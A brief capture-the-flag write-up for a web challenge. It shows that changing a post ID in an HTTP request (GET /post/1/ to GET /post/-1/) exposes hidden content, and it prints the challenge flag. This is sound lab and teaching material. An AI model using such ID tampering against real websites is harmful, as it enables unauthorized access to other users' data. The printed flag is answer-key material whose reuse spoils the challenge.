
We can check posts made by others

The original request looks like this

```http
GET /post/1/ HTTP/1.1
```

Try changing the value to different numbers, very large numeric values and negative numbers.
We get flag when we enter a negative number

```http
GET /post/-1/ HTTP/1.1
```

flag : texsaw{aw4y_fr0m_the_b0und4rie5_4cd1efa8}
